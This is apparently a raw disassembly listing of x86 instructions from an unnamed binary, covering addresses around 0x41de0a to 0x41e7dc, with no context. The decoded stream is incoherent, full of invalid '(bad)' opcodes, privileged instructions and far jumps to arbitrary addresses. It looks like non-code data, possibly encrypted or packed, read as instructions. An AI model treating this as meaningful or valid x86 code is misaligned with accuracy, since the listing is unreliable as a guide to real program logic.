  41de0a:	add    BYTE PTR [eax],al
  41de0c:	jbe    0x41ddad
  41de0e:	cmp    DWORD PTR [edx-0x5],esp
  41de11:	ss jae 0x41de45
  41de14:	mov    ah,0x37
  41de16:	push   ss
  41de17:	std    
  41de18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de19:	aaa    
  41de1a:	xchg   ebp,eax
  41de1b:	xchg   esi,eax
  41de1c:	jo     0x41de08
  41de1e:	stos   DWORD PTR es:[edi],eax
  41de1f:	xchg   BYTE PTR [esi-0x1d],cl
  41de22:	xor    ebp,DWORD PTR [edi]
  41de24:	mov    DWORD PTR [edx-0x35],esp
  41de27:	adc    BYTE PTR [ecx],al
  41de29:	icebp  
  41de2a:	je     0x41de2a
  41de2c:	imul   eax,DWORD PTR [esp+ebp*8-0x45d8ead1],0x48
  41de34:	mov    ds,WORD PTR [ecx]
  41de36:	lahf   
  41de37:	xlat   BYTE PTR ds:[ebx]
  41de38:	pushf  
  41de39:	es leave 
  41de3b:	add    ah,ch
  41de3d:	pop    eax
  41de3e:	outs   dx,DWORD PTR ds:[esi]
  41de3f:	daa    
  41de40:	inc    eax
  41de41:	popa   
  41de42:	sbb    BYTE PTR [eax+ebp*8-0xc],bl
  41de46:	fistp  WORD PTR ds:0xe1cf5faf
  41de4c:	mov    DWORD PTR [esp+edx*4+0x39ca100],0x13289dc0
  41de57:	repz mov ds:0xd21686d9,al
  41de5d:	imul   esp,ebp,0x3d
  41de60:	retf   0xa5ae
  41de63:	mov    ds:0x6202f385,al
  41de68:	xor    BYTE PTR [esi-0x77c3b45c],dh
  41de6e:	add    bh,BYTE PTR [edx-0x7f]
  41de71:	jne    0x41def1
  41de73:	or     dh,al
  41de75:	adc    ecx,DWORD PTR ss:[esi+0x6b]
  41de79:	dec    edx
  41de7a:	cdq    
  41de7b:	sbb    eax,0x4b87fafa
  41de80:	cmp    ch,BYTE PTR [eax]
  41de82:	lahf   
  41de83:	test   eax,0x683c92f3
  41de88:	adc    ah,al
  41de8a:	push   edi
  41de8b:	retfw  
  41de8d:	fmul   QWORD PTR [ebp+ecx*2+0x6dab956b]
  41de94:	cmp    DWORD PTR [ebx-0x3069ee24],ebp
  41de9a:	out    dx,eax
  41de9b:	(bad)  
  41de9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de9d:	je     0x41deb3
  41de9f:	fs test al,0xbf
  41dea2:	jl     0x41de59
  41dea4:	mov    cl,0x44
  41dea6:	jo     0x41deb0
  41dea8:	and    cl,BYTE PTR [ecx-0x5b]
  41deab:	mov    edx,0xa12c468f
  41deb0:	sbb    edx,eax
  41deb2:	(bad)  
  41deb3:	(bad)  
  41deb4:	fiadd  DWORD PTR [edx]
  41deb6:	adc    DWORD PTR ds:0x3977ed70,ecx
  41debc:	out    dx,al
  41debd:	push   esp
  41debe:	push   edx
  41debf:	aaa    
  41dec0:	arpl   WORD PTR [eax+ecx*4+0x76],di
  41dec4:	nop
  41dec5:	sub    edx,DWORD PTR [esp+edi*2]
  41dec8:	(bad)  
  41dec9:	ss (bad) 
  41decb:	icebp  
  41decc:	int    0x72
  41dece:	rol    DWORD PTR [edi-0x67c3daa1],1
  41ded4:	into   
  41ded5:	inc    ecx
  41ded6:	jg     0x41deaf
  41ded8:	mov    ds:0x573ebd18,eax
  41dedd:	es fs push 0xffffffb7
  41dee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dee2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dee3:	cmp    al,0x61
  41dee5:	adc    eax,0x8941aa38
  41deea:	je     0x41df3d
  41deec:	jg     0x41df01
  41deee:	sbb    al,0xa8
  41def0:	mov    dl,0x98
  41def2:	cmp    DWORD PTR [ebp-0x7a],esp
  41def5:	and    eax,0x9a1acffa
  41defa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41defb:	(bad)  
  41defc:	xchg   esi,eax
  41defd:	xor    edi,DWORD PTR [eax+0x57]
  41df00:	rcl    BYTE PTR [eax],cl
  41df02:	dec    edi
  41df03:	mov    ebp,0x9463880e
  41df08:	sbb    eax,0x8c59a972
  41df0d:	icebp  
  41df0e:	das    
  41df0f:	jae    0x41df11
	...
  41df71:	add    BYTE PTR [eax],al
  41df73:	add    BYTE PTR [edi],bh
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x9f549ce9
  41df82:	sub    eax,0x13e8834
  41df87:	add    BYTE PTR [ecx+eax*1],al
  41df8a:	add    BYTE PTR [eax],al
  41df8c:	cmp    al,0xb9
  41df8e:	aaa    
  41df8f:	imul   esi,DWORD PTR [eax-0x3f],0xffffffc5
  41df93:	ss (bad) 
  41df95:	mov    bx,WORD PTR [edx-0x4128dc21]
  41df9c:	and    BYTE PTR [edi],dh
  41df9e:	pop    eax
  41df9f:	sub    al,0xce
  41dfa1:	loope  0x41df67
  41dfa3:	scas   al,BYTE PTR es:[edi]
  41dfa4:	push   cs
  41dfa5:	adc    BYTE PTR [edx-0x29726ecc],bh
  41dfab:	sbb    al,0xbb
  41dfad:	loop   0x41dfc3
  41dfaf:	int3   
  41dfb0:	sub    eax,0x6b44fca
  41dfb5:	jp     0x41dfa0
  41dfb7:	xor    al,0xcd
  41dfb9:	jmp    0x9084:0x15fc0c7
  41dfc0:	aad    0xcf
  41dfc2:	pop    edi
  41dfc3:	lock lds ebx,FWORD PTR [edi-0x2c]
  41dfc7:	mov    eax,DWORD PTR [edi-0x69]
  41dfca:	out    0x30,eax
  41dfcc:	add    al,BYTE PTR [ebx]
  41dfce:	hlt    
  41dfcf:	es sti 
  41dfd1:	and    BYTE PTR [eax],0x11
  41dfd4:	or     ecx,eax
  41dfd6:	mov    ecx,0x66e4743d
  41dfdb:	sub    esi,edi
  41dfdd:	fs jmp 0x41e057
  41dfe0:	stos   BYTE PTR es:[edi],al
  41dfe1:	mov    ds:0x33ea13f,al
  41dfe6:	std    
  41dfe7:	add    al,BYTE PTR [edi+0xa]
  41dfea:	(bad)  [edx]
  41dfec:	aas    
  41dfed:	gs jae 0x41e009
  41dff0:	int    0xbf
  41dff2:	sub    DWORD PTR [ecx-0x56f1794f],esi
  41dff8:	test   ebx,eax
  41dffa:	lods   al,BYTE PTR ds:[esi]
  41dffb:	fmul   QWORD PTR [ebx+edx*8]
  41dffe:	daa    
  41dfff:	mov    ah,ah
  41e001:	icebp  
  41e002:	jo     0x41dfa3
  41e004:	add    eax,0xa45c8a93
  41e009:	imul   esp,DWORD PTR [eax],0xccd682b2
  41e00f:	aad    0x27
  41e011:	adc    edi,DWORD PTR [edi+0x11]
  41e014:	dec    eax
  41e015:	push   0x78
  41e017:	sub    esi,DWORD PTR [ebx]
  41e019:	cmc    
  41e01a:	dec    ebp
  41e01b:	(bad)  [eax+eax*2-0x7d7816e]
  41e022:	pop    es
  41e023:	mov    bl,0x52
  41e025:	adc    BYTE PTR [ebp+0x6f],bh
  41e028:	mov    eax,ds:0x4cfebb47
  41e02d:	shl    DWORD PTR [edi+esi*1+0x3d],0xe1
  41e032:	cdq    
  41e033:	mov    esi,0x9357d053
  41e038:	adc    ch,BYTE PTR [eax]
  41e03a:	sahf   
  41e03b:	push   0x67497876
  41e040:	xchg   ebx,eax
  41e041:	fs int3 
  41e043:	retf   
  41e044:	dec    esi
  41e045:	repnz inc eax
  41e047:	jmp    eax
  41e049:	cmp    al,0x3e
  41e04b:	ret    
  41e04c:	mov    cl,0xcd
  41e04e:	out    dx,eax
  41e04f:	cmp    ebx,ecx
  41e051:	or     eax,0x2ee8b9fd
  41e056:	adc    cl,BYTE PTR [edi+0x6b5ad07a]
  41e05c:	dec    ecx
  41e05d:	jge    0x41e02a
  41e05f:	adc    ch,BYTE PTR [esi-0x2a9baf4f]
  41e065:	mov    ch,BYTE PTR [edx+0x35cfdefb]
  41e06b:	xor    al,0xb5
  41e06d:	sub    al,0x3
  41e06f:	sub    BYTE PTR [eax-0x69],al
  41e072:	or     BYTE PTR [ebp-0x2f],dh
  41e075:	xchg   ebp,eax
  41e076:	jb     0x41e067
  41e078:	mov    eax,0xc3ea3ffa
  41e07d:	rol    ah,0x97
  41e080:	push   esp
  41e081:	imul   edi,DWORD PTR ds:0x6a69c87f,0x74823d70
  41e08b:	shr    DWORD PTR [eax],0xef
  41e08e:	mov    ecx,0xd0
	...
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	iret   
  41e101:	popa   
  41e102:	mov    bh,BYTE PTR [ebx+0x13f8c]
  41e108:	add    al,0x1
  41e10a:	add    BYTE PTR [eax],al
  41e10c:	into   
  41e10d:	ss push esp
  41e10f:	lods   eax,DWORD PTR ds:[esi]
  41e110:	(bad)  
  41e111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e112:	pop    esp
  41e113:	inc    ecx
  41e114:	imul   esi,DWORD PTR [ebx],0x66309669
  41e11a:	mov    BYTE PTR [eax+ebx*4],bh
  41e11d:	pop    ebx
  41e11e:	jecxz  0x41e18e
  41e120:	aam    0x29
  41e122:	out    dx,eax
  41e123:	ins    DWORD PTR es:[edi],dx
  41e124:	in     eax,0xe7
  41e126:	mov    WORD PTR [edx-0x16b5f3c7],ss
  41e12c:	xchg   BYTE PTR [edi-0x35],ch
  41e12f:	push   edx
  41e130:	mov    ah,0x12
  41e132:	jg     0x41e129
  41e134:	sub    DWORD PTR [ebp+0x1e],edi
  41e137:	enter  0x5d90,0x9d
  41e13b:	loopne 0x41e131
  41e13d:	aas    
  41e13e:	ret    0xd505
  41e141:	push   es
  41e142:	lds    esi,FWORD PTR [eax-0xd4741f2]
  41e148:	in     al,dx
  41e149:	dec    DWORD PTR [eax]
  41e14b:	adc    bl,BYTE PTR [eax+0x3211a5ad]
  41e151:	xchg   BYTE PTR ds:[esi-0x1eaf9d09],dl
  41e158:	jmp    0xa6a62195
  41e15d:	mov    bh,0xe3
  41e15f:	adc    al,0x98
  41e161:	out    0x97,eax
  41e163:	mov    esp,0x45d50d37
  41e168:	mov    eax,ds:0x1fc79e85
  41e16d:	or     BYTE PTR [ebx],bl
  41e16f:	push   ebp
  41e170:	inc    eax
  41e171:	xchg   ebp,eax
  41e172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e173:	cmp    esi,DWORD PTR [eax-0x1e4ed8d9]
  41e179:	jecxz  0x41e199
  41e17b:	and    BYTE PTR [eax-0x3],bh
  41e17e:	or     al,0x2a
  41e180:	stc    
  41e181:	pop    edx
  41e182:	xchg   esi,eax
  41e183:	cs cwde 
  41e185:	pop    es
  41e186:	add    BYTE PTR [ebx-0x7],bh
  41e189:	push   eax
  41e18a:	shr    BYTE PTR [eax-0x46],cl
  41e18d:	sub    BYTE PTR [eax+ebx*8+0x1211fe74],dh
  41e194:	outs   dx,DWORD PTR ds:[esi]
  41e195:	(bad)  
  41e196:	jecxz  0x41e204
  41e198:	adc    ebx,DWORD PTR [eax-0x9142105]
  41e19e:	and    eax,0xc0a8bcb
  41e1a3:	jns    0x41e15f
  41e1a5:	sub    esp,DWORD PTR ds:0x8c2bb5bf
  41e1ab:	mov    dh,0x5f
  41e1ad:	and    DWORD PTR [ecx],esp
  41e1af:	dec    ecx
  41e1b0:	test   BYTE PTR [eax],ch
  41e1b2:	gs mov dh,0xce
  41e1b5:	and    esp,DWORD PTR [ecx]
  41e1b7:	sbb    edi,DWORD PTR [ebp-0x4fb558aa]
  41e1bd:	(bad)  
  41e1be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1bf:	xlat   BYTE PTR ds:[ebx]
  41e1c0:	xor    cl,BYTE PTR [bp+si-0x768e]
  41e1c5:	inc    esi
  41e1c6:	cwde   
  41e1c7:	cmp    al,ah
  41e1c9:	jns    0x41e1cb
  41e1cb:	shl    ebp,0xfb
  41e1ce:	jecxz  0x41e180
  41e1d0:	ja     0x41e183
  41e1d2:	ds out dx,al
  41e1d4:	sub    ebx,DWORD PTR [esi+0x32ddd38e]
  41e1da:	or     bh,ah
  41e1dc:	cs arpl bx,sp
  41e1df:	xor    al,0xf5
  41e1e1:	xor    eax,0x80894475
  41e1e6:	inc    edx
  41e1e7:	mov    dl,BYTE PTR [eax]
  41e1e9:	add    al,BYTE PTR [ebp+0x5f2c730a]
  41e1ef:	jmp    0x9f7a83f4
  41e1f4:	pop    ds
  41e1f5:	sahf   
  41e1f6:	les    eax,FWORD PTR [edx-0x25]
  41e1f9:	clc    
  41e1fa:	lahf   
  41e1fb:	sbb    esp,DWORD PTR [edx+0x32f82300]
  41e201:	jbe    0x41e210
  41e203:	dec    eax
  41e204:	int3   
  41e205:	cmp    esp,esi
  41e207:	push   esi
  41e208:	dec    eax
  41e209:	dec    ecx
  41e20a:	sub    DWORD PTR [ecx-0x68],ebx
  41e20d:	sbb    DWORD PTR [esi+0x54],0x0
	...
  41e273:	add    BYTE PTR [ebx-0x1988fe],ch
  41e279:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e27f:	or     al,0xaa
  41e281:	imul   ebp,DWORD PTR [ebp+0x140906a],0x10400
  41e28b:	add    ah,ah
  41e28d:	dec    esi
  41e28e:	mov    ch,0x7b
  41e290:	push   ebp
  41e291:	adc    DWORD PTR [edx-0x7d04ee65],esp
  41e297:	cmp    BYTE PTR [ebp+0x7b6b2138],cl
  41e29d:	pop    edx
  41e29e:	je     0x41e305
  41e2a0:	xchg   esi,eax
  41e2a1:	and    edi,edi
  41e2a3:	mov    BYTE PTR [ebx],bl
  41e2a5:	das    
  41e2a6:	je     0x41e2ab
  41e2a8:	mov    cl,0x7d
  41e2aa:	hlt    
  41e2ab:	cdq    
  41e2ac:	mov    dl,0xd4
  41e2ae:	lds    edx,FWORD PTR [ecx+0x4]
  41e2b1:	mov    ?,WORD PTR [edx+0x723ce51e]
  41e2b7:	enter  0x7c0b,0xd8
  41e2bb:	fwait
  41e2bc:	pusha  
  41e2bd:	pushf  
  41e2be:	add    BYTE PTR [ecx+eiz*4+0x22ed7a2b],0x31
  41e2c6:	dec    ebx
  41e2c7:	and    DWORD PTR [esi+0x27c5b050],ebx
  41e2cd:	jecxz  0x41e298
  41e2cf:	cmp    ah,al
  41e2d1:	and    al,0x5c
  41e2d3:	add    al,0xd6
  41e2d5:	cdq    
  41e2d6:	iret   
  41e2d7:	or     al,0x40
  41e2d9:	sub    DWORD PTR [ebp+0x17ae181c],esi
  41e2df:	idiv   esp
  41e2e1:	pop    ecx
  41e2e2:	push   ss
  41e2e3:	fisub  DWORD PTR [ebx+0x1729bbea]
  41e2e9:	retf   
  41e2ea:	push   ss
  41e2eb:	loopne 0x41e353
  41e2ed:	mov    dh,0x4
  41e2ef:	rcl    BYTE PTR ds:0x6dcd135c,1
  41e2f5:	in     eax,0xbe
  41e2f7:	aaa    
  41e2f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2f9:	sub    esp,DWORD PTR [edi]
  41e2fb:	pop    ds
  41e2fc:	mov    ds:0x5f693fe4,eax
  41e301:	retf   
  41e302:	popf   
  41e303:	out    dx,eax
  41e304:	jno    0x41e2d1
  41e306:	jge    0x41e2b0
  41e308:	jg     0x41e2e8
  41e30a:	push   es
  41e30b:	jae    0x41e2f5
  41e30d:	iret   
  41e30e:	fnstcw WORD PTR [edx]
  41e310:	dec    ebp
  41e311:	mov    dh,0x92
  41e313:	fmul   QWORD PTR [ecx-0x9]
  41e316:	cli    
  41e317:	(bad)  
  41e318:	out    0xc7,al
  41e31a:	dec    esi
  41e31b:	fldpi  
  41e31d:	mov    WORD PTR [ebp+0x74],?
  41e320:	stc    
  41e321:	out    0x43,al
  41e323:	jmp    0x3bc0:0xf2ad6dda
  41e32a:	jg     0x41e2e6
  41e32c:	int3   
  41e32d:	ficomp DWORD PTR [edx+0x7d]
  41e330:	lds    ebp,FWORD PTR ds:0xd4b2b8c7
  41e336:	cmp    bh,BYTE PTR [edi+0x16]
  41e339:	test   al,0x2c
  41e33b:	inc    eax
  41e33c:	and    eax,ebp
  41e33e:	imul   ebp,DWORD PTR [ebp-0x7e],0xffffffda
  41e342:	mov    ch,0x7a
  41e344:	jae    0x41e2cd
  41e346:	jo     0x41e34b
  41e348:	imul   ebx,DWORD PTR [ebx+0x3b],0x347f4046
  41e34f:	or     al,0x85
  41e351:	fwait
  41e352:	and    DWORD PTR [esi],ebx
  41e354:	nop
  41e355:	stc    
  41e356:	dec    ebp
  41e357:	ret    
  41e358:	push   eax
  41e359:	aam    0xfc
  41e35b:	out    dx,eax
  41e35c:	pop    ss
  41e35d:	push   DWORD PTR [esp+eax*2+0x116cc9e1]
  41e364:	dec    al
  41e366:	fimul  WORD PTR [eax+0x336ad760]
  41e36c:	push   0xcaebc6c2
  41e371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e372:	jp     0x41e3e3
  41e374:	gs addr16 push eax
  41e377:	into   
  41e378:	sbb    al,0x60
  41e37a:	mov    WORD PTR [eax+0xc14e100],ss
  41e380:	inc    edi
  41e381:	xor    al,0x65
  41e383:	adc    esp,ebp
  41e385:	inc    ecx
  41e386:	xchg   DWORD PTR [edi+0x78],edx
  41e389:	test   cl,cl
  41e38b:	test   eax,ebp
  41e38d:	adc    eax,ecx
  41e38f:	lods   eax,DWORD PTR ds:[esi]
	...
  41e3f4:	mov    DWORD PTR [edx],edx
  41e3f6:	ja     0x41e417
  41e3f8:	(bad)  
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x132b4009
  41e403:	test   BYTE PTR [ecx+eax*2+0x1040001],dl
  41e40a:	add    BYTE PTR [eax],al
  41e40c:	and    ah,bh
  41e40e:	mov    ah,cl
  41e410:	xor    BYTE PTR [ebx],bl
  41e412:	psadbw mm2,QWORD PTR [eax]
  41e415:	test   BYTE PTR [ebx],ch
  41e417:	dec    edx
  41e418:	mov    eax,0x4a6c225c
  41e41d:	push   ecx
  41e41e:	retf   
  41e41f:	push   esi
  41e420:	cmp    DWORD PTR [ebp-0x6],edi
  41e423:	cld    
  41e424:	jl     0x41e46c
  41e426:	push   esp
  41e427:	sub    DWORD PTR ds:0x4db35794,0x52
  41e42e:	call   0x8e4e:0xcb45a5dd
  41e435:	jno    0x41e479
  41e437:	ror    bh,1
  41e439:	loop   0x41e49f
  41e43b:	dec    esp
  41e43c:	pusha  
  41e43d:	sub    BYTE PTR [esi],dh
  41e43f:	sbb    dh,bl
  41e441:	mov    esp,0xf9ea18f5
  41e446:	add    al,0xc0
  41e448:	mov    bh,0x23
  41e44a:	adc    eax,0xe20a042e
  41e44f:	xchg   edi,eax
  41e450:	test   esp,ebp
  41e452:	js     0x41e41f
  41e454:	int    0x5a
  41e456:	mov    edi,0xc1afa3a2
  41e45b:	dec    ebx
  41e45c:	ret    0x37d1
  41e45f:	aaa    
  41e460:	push   0x901b92d0
  41e465:	fs aam 0x2c
  41e468:	dec    esp
  41e469:	sbb    al,0x36
  41e46b:	xlat   BYTE PTR ds:[ebx]
  41e46c:	lea    eax,[eax+0x7b]
  41e46f:	(bad)  
  41e470:	xor    dh,BYTE PTR [eax-0x2f49e638]
  41e476:	xchg   BYTE PTR [edx+0x5d],dl
  41e479:	jg     0x41e4c7
  41e47b:	or     BYTE PTR [eax],ch
  41e47d:	pop    edx
  41e47e:	add    ebx,esp
  41e480:	sbb    al,0xc2
  41e482:	jne    0x41e465
  41e484:	cmp    BYTE PTR [ecx],ch
  41e486:	jmp    0xbe662b12
  41e48b:	das    
  41e48c:	fisub  DWORD PTR [esi+ebp*1]
  41e48f:	movzx  ebp,cx
  41e492:	push   0x55
  41e494:	dec    esi
  41e495:	fstp   DWORD PTR [eax]
  41e497:	mov    ch,dl
  41e499:	push   ss
  41e49a:	dec    esp
  41e49b:	jne    0x41e459
  41e49d:	scas   al,BYTE PTR es:[edi]
  41e49e:	ret    
  41e49f:	pop    es
  41e4a0:	lahf   
  41e4a1:	or     DWORD PTR [eax],edi
  41e4a3:	leave  
  41e4a4:	jmp    0x52c:0xb864ad42
  41e4ab:	sahf   
  41e4ac:	adc    al,0x94
  41e4ae:	dec    esp
  41e4af:	ds inc esi
  41e4b1:	fcmovne st,st(7)
  41e4b3:	xchg   ebp,eax
  41e4b4:	addr16 loopne 0x41e50c
  41e4b7:	test   edi,ebx
  41e4b9:	pop    eax
  41e4ba:	ret    0x925
  41e4bd:	imul   edi,DWORD PTR [edx],0xffffff8c
  41e4c0:	sbb    al,0xde
  41e4c2:	mov    al,0x54
  41e4c4:	inc    DWORD PTR [ebx-0x52]
  41e4c7:	xor    DWORD PTR [edi+0xc8cae00],edx
  41e4cd:	xchg   ebx,eax
  41e4ce:	shr    BYTE PTR ds:0x171dc7c8,0xa
  41e4d5:	rcl    cl,1
  41e4d7:	inc    eax
  41e4d8:	xor    edx,DWORD PTR [esi]
  41e4da:	fdiv   st,st(0)
  41e4dc:	sub    eax,0x85189d46
  41e4e1:	jmp    0x1296cc44
  41e4e6:	xor    eax,0x33df230c
  41e4eb:	lock push 0x6f
  41e4ee:	cwde   
  41e4ef:	imul   ecx,ecx,0x25493a13
  41e4f5:	jmp    0x6f1c6396
  41e4fa:	cmp    bl,BYTE PTR [edi]
  41e4fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4fd:	inc    eax
  41e4fe:	std    
  41e4ff:	mov    DWORD PTR [edx-0x757949b2],esp
  41e505:	mov    eax,0xa3de028
  41e50a:	jo     0x41e573
  41e50c:	mov    esp,esi
  41e50e:	arpl   sp,di
	...
  41e574:	and    BYTE PTR [edx-0x35],ch
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e5b6
  41e581:	inc    ecx
  41e582:	adc    eax,0x142988c
  41e587:	add    BYTE PTR [ecx+eax*1],al
  41e58a:	add    BYTE PTR [eax],al
  41e58c:	int3   
  41e58d:	push   esi
  41e58e:	call   0x4a1a:0xebee8077
  41e595:	jg     0x41e53f
  41e597:	ret    0xe0aa
  41e59a:	jmp    0x7c1d1a99
  41e59f:	sbb    al,BYTE PTR [edi-0x7d]
  41e5a2:	sti    
  41e5a3:	mov    ch,ah
  41e5a5:	call   0xb792a292
  41e5aa:	and    bh,bh
  41e5ac:	push   ebx
  41e5ad:	mov    bh,0xcf
  41e5af:	sbb    DWORD PTR [esi+0x139c8f1f],ecx
  41e5b5:	icebp  
  41e5b6:	shr    DWORD PTR [ebp+0x4e14a7a],1
  41e5bc:	into   
  41e5bd:	xor    al,0xcf
  41e5bf:	(bad)  
  41e5c0:	jo     0x41e624
  41e5c2:	adc    esi,DWORD PTR [esi+0x33]
  41e5c5:	push   es
  41e5c6:	and    DWORD PTR [eax+0x7a],eax
  41e5c9:	xchg   ebx,eax
  41e5ca:	scas   eax,DWORD PTR es:[edi]
  41e5cb:	sub    eax,0xe2819444
  41e5d0:	mov    ds:0xc70c50cf,al
  41e5d5:	pop    edx
  41e5d6:	jbe    0x41e5eb
  41e5d8:	xor    bl,BYTE PTR [ebp+0x5c]
  41e5db:	(bad)  
  41e5dc:	cmp    esp,edx
  41e5de:	(bad)  
  41e5e0:	push   esp
  41e5e1:	sbb    ch,BYTE PTR [edi]
  41e5e3:	test   al,0xe9
  41e5e5:	cmp    eax,ebp
  41e5e7:	repz mov edi,0xde9ce2a5
  41e5ed:	mov    DWORD PTR [eax-0x2c],edi
  41e5f0:	test   dh,bl
  41e5f2:	lea    ebx,[eax+0x28]
  41e5f5:	xor    al,0x73
  41e5f7:	or     DWORD PTR [ebp+edi*4+0x56],esi
  41e5fb:	(bad)  
  41e5fc:	cmp    eax,DWORD PTR [esp+eax*8+0x72a5b3d9]
  41e603:	xchg   BYTE PTR [ebx+0x58],dh
  41e606:	ds push 0x62d65828
  41e60c:	cld    
  41e60d:	bound  ecx,QWORD PTR [ebx-0x677b5ab6]
  41e613:	test   al,0xa8
  41e615:	add    bh,BYTE PTR [edi-0x6d]
  41e618:	push   0x25
  41e61a:	ret    
  41e61b:	fs sbb eax,0x18980040
  41e621:	int    0x95
  41e623:	iret   
  41e624:	popf   
  41e625:	inc    esp
  41e626:	push   edi
  41e627:	mov    al,0x96
  41e629:	push   esp
  41e62a:	int    0xcc
  41e62c:	push   ebx
  41e62d:	mov    ebp,0x846a1ee4
  41e632:	jno    0x41e68f
  41e634:	cmp    eax,0xdd2bab9e
  41e639:	push   ecx
  41e63a:	xor    esi,esp
  41e63c:	push   eax
  41e63d:	stc    
  41e63e:	jmp    0x41e67e
  41e640:	add    esp,DWORD PTR [eax+0x131e23f5]
  41e646:	pop    ecx
  41e647:	ror    edx,1
  41e649:	pop    ecx
  41e64a:	les    ebp,FWORD PTR [ecx-0x23]
  41e64d:	jmp    0x41e5f2
  41e64f:	sbb    eax,0x89c5ccd4
  41e654:	out    dx,al
  41e655:	loopne 0x41e63a
  41e657:	mov    edi,DWORD PTR [edi]
  41e659:	xor    BYTE PTR [edx],dl
  41e65b:	and    dl,al
  41e65d:	inc    edx
  41e65e:	add    eax,0xe0089924
  41e663:	xor    edx,eax
  41e665:	pop    eax
  41e666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e667:	jmp    0x41e69a
  41e669:	addr16 mov ebp,0xb8c8d951
  41e66f:	out    0x7a,al
  41e671:	aad    0x70
  41e673:	mov    esp,0x731ef062
  41e678:	push   eax
  41e679:	sar    BYTE PTR [ecx],0x54
  41e67c:	sahf   
  41e67d:	test   al,0x7d
  41e67f:	loopne 0x41e6c0
  41e681:	wrmsr  
  41e683:	dec    ecx
  41e684:	jne    0x41e6ff
  41e686:	aad    0xf1
  41e688:	mov    edi,0x5678f6f2
  41e68d:	jle    0x41e6b0
  41e68f:	pop    ecx
	...
  41e6f4:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e6fa:	cmc    
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    eax,DWORD PTR [esi]
  41e701:	sahf   
  41e702:	jnp    0x41e6be
  41e704:	pushf  
  41e705:	inc    ebx
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    al,0x1
  41e70a:	add    BYTE PTR [eax],al
  41e70c:	fld    TBYTE PTR ds:0xb52bd48b
  41e712:	inc    DWORD PTR [ebx-0xae348dc]
  41e718:	add    eax,0x18cbea03
  41e71d:	fisttp QWORD PTR [ebp-0x32b358da]
  41e723:	add    al,0x5
  41e725:	gs ret 
  41e727:	inc    ecx
  41e728:	fidivr DWORD PTR [ebp-0x28]
  41e72b:	xor    esp,esi
  41e72d:	mov    WORD PTR [esi+0x1f],?
  41e730:	stc    
  41e731:	jne    0x41e75b
  41e733:	fmulp  st(0),st
  41e735:	in     eax,dx
  41e736:	and    bl,BYTE PTR [eax-0x4f]
  41e739:	frstor ds:0x16433734
  41e73f:	add    esi,DWORD PTR [ebp-0x2c89e297]
  41e745:	fnstsw ax
  41e747:	push   edx
  41e748:	sar    BYTE PTR [eax],0x29
  41e74b:	shr    DWORD PTR [edi+0x42d8dfa6],1
  41e751:	ins    BYTE PTR es:[edi],dx
  41e752:	loop   0x41e78c
  41e754:	add    al,dh
  41e756:	into   
  41e757:	repnz sahf 
  41e759:	cli    
  41e75a:	mov    BYTE PTR ds:0x7dc1fe5d,bh
  41e760:	or     edi,ebp
  41e762:	jmp    0x41e7a8
  41e764:	lea    edx,[ecx]
  41e766:	lods   eax,DWORD PTR ds:[esi]
  41e767:	je     0x41e729
  41e769:	cs in  eax,dx
  41e76b:	push   ebx
  41e76c:	and    DWORD PTR [esi+0x54],ecx
  41e76f:	push   eax
  41e770:	mov    edx,0xebe6906c
  41e775:	push   edi
  41e776:	mov    al,ds:0xf613aafe
  41e77b:	aad    0xa
  41e77d:	ficom  DWORD PTR [edx-0x16]
  41e780:	jb     0x41e773
  41e782:	cwde   
  41e783:	clc    
  41e784:	and    BYTE PTR [ebx+0x2b],bl
  41e787:	pop    edi
  41e788:	or     DWORD PTR [ebx-0x7d47dd57],edi
  41e78e:	push   es
  41e78f:	je     0x41e75c
  41e791:	cmc    
  41e792:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e793:	and    BYTE PTR [ebx],0xf0
  41e796:	jae    0x41e758
  41e798:	inc    ebx
  41e799:	idiv   edx
  41e79b:	pusha  
  41e79c:	xlat   BYTE PTR ds:[ebx]
  41e79d:	sub    DWORD PTR [eax+0x6e037c26],ebp
  41e7a3:	retf   
  41e7a4:	int    0x5d
  41e7a6:	fld    TBYTE PTR ds:0xe621280b
  41e7ac:	xchg   esi,eax
  41e7ad:	cmp    DWORD PTR [edx],edi
  41e7af:	pop    ecx
  41e7b0:	sbb    al,dh
  41e7b2:	sti    
  41e7b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7b4:	xchg   edx,eax
  41e7b5:	cs ret 0x986a
  41e7b9:	fsub   st,st(6)
  41e7bb:	mov    bl,0x18
  41e7bd:	ret    0x8e25
  41e7c0:	cmp    dl,BYTE PTR [esi-0x3d59af69]
  41e7c6:	das    
  41e7c7:	sub    DWORD PTR [ebp-0x2f083513],0x25df9ef7
  41e7d1:	xor    eax,0xc2ccf575
  41e7d6:	ret    0xa30d
  41e7d9:	pop    es
  41e7da:	fucom  st(3)
  41e7dc:	inc    ebp
